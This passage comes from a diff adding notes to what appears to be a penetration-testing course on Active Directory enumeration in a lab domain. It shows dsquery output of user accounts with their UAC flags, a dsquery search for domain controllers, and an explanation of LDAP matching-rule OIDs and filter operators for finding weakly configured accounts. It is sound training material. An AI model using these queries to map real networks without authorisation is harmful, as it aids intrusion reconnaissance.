+  CN=Guest,CN=Users,DC=INLANEFREIGHT,DC=LOCAL                                                    66082
+  CN=Marion Lowe,OU=HelpDesk,OU=IT,OU=HQ-NYC,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL      66080
+  CN=Yolanda Groce,OU=HelpDesk,OU=IT,OU=HQ-NYC,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL    66080
+  CN=Eileen Hamilton,OU=DevOps,OU=IT,OU=HQ-NYC,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL    66080
+  CN=Jessica Ramsey,CN=Users,DC=INLANEFREIGHT,DC=LOCAL                                           546
+  CN=NAGIOSAGENT,OU=Service Accounts,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL                           544
+  CN=LOGISTICS$,CN=Users,DC=INLANEFREIGHT,DC=LOCAL                                               2080
+  CN=FREIGHTLOGISTIC$,CN=Users,DC=INLANEFREIGHT,DC=LOCAL                                         2080
+```
+
+#### Searching for DCs
+
+The below search filter looks for all DCs in the current domain, limiting to five results.
+
+```powershell
+PS C:\Users\forend.INLANEFREIGHT> dsquery * -filter "(userAccountControl:1.2.840.113556.1.4.803:=8192)" -limit 5 -attr sAMAccountName
+
+ sAMAccountName
+ ACADEMY-EA-DC01$
+```
+
+#### LDAP Filtering Explained
+
+You will notice in the queries above that you are using strings such as ```userAccountControl:1.2.840.113556.1.4.803:=8192```. These strings are common LDAP queries that can be used with several different tools too, including AD PowerShell, ldapsearch, and many others.
+
+```userAccountControl:1.2.840.113556.1.4.803:``` specifies that you are looking at the User Account Control attributes for an object. This portion can change to include three different values.
+
+##### UAC Values
+
+```=8192``` represents the decimal bitmask you want to match in this search. This decimal number corresponds to a corresponding UAC attribute flag that determines if an attribute like ```password is not required``` or ```account is locked``` is set. These values can compound and make multiple different bit entries.
+
+![ad credentialed enum 4](../../../../images/ad_credentialed_enum4.png)
+
+##### OID match strings
+
+OIDs are rules used to match bit values with attributes, as seen above. For LDAP and AD, there are three main matching rules:
+
+1. ```1.2.840.113556.1.4.803```
+
+When using this rule as you did in the example above, you are saying the bit value must match completely to meet the search requirements. Great for matching a singular attribute.
+
+2. ```1.2.840.113556.1.4.804```
+
+When using this rule, you are saying that you want your results to show any attribute match if any bit in the chain matches. This works in the case of an object having multiple attributes set.
+
+3. ```1.2.840.113556.1.4.1941```
+
+This rule is used to match filters that apply to the Distinguished Name of an object and will search through all ownership and membership entries.
+
+##### Logical Operators
+
+When building out search strings, you can utilize logical operators to combine values for the search. The operators ```&```, ```|```, and ```!``` are used for this purpose. For example you can combine multiple search criteria with the ```&``` operator like so: ```(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=64))``` .
+
+The above exmaple sets the first criteria that the object must be a user and combines it with searching for a UAC bit value of 64 (_Password can't change_). A user with that attribute set would match the filter. You can take this even further and combine multiple attributes like ```(&(1) (2) (3))```. The ```!``` and ```|``` operators can work similarly. For example, your filter above can be modified as follows: ```(&(objectClass=user)(!userAccountControl:1.2.840.113556.1.4.803:=64))```.
+
+This would search for any user object that does NOT have the "Password Can't Change" attribute set. When thinking about users, groups, and other objects in AD, you ability to search with LDAP queries is pretty extensive.
+
+A lot can be done with UAC filters, operators, and attribute matching with OID rules.
